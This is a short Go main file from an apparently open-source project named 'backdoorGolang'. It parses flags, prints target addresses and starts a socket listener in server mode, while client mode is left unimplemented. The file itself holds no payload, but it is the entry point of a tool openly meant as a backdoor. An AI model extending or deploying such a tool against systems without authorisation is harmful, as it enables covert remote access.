package main

import (
	// "fmt"
	"github.com/pilebones/backdoorGolang/core/cli"
	"github.com/pilebones/backdoorGolang/core/socket"
	"fmt"
)

func main() {

	// Parsing arguments before running
	var context cli.Context = cli.InitFlags()

	// Display target resolution before create socket provider
	if context.IsHostIsResolved {
		fmt.Printf("Target resolved to %s (%s)\n", context.Ipv4, context.Ipv6)
	}

	if context.UseListenMode {
		fmt.Printf("Init server mode : feature not fully implemented yet work in progress\n")
		fmt.Printf("Listening on %s:%d\n", context.Host, context.Port)
		// var socketWrapper socket.SocketWrapper = socket.SocketWrapper(context)
		var server socket.ServerProvider = socket.CreateServer(context.CastToSocketWrapper())
		server.Start()

	} else {
		fmt.Printf("Init client mode : feature not fully implemented yet work in progress\n")

	}
}
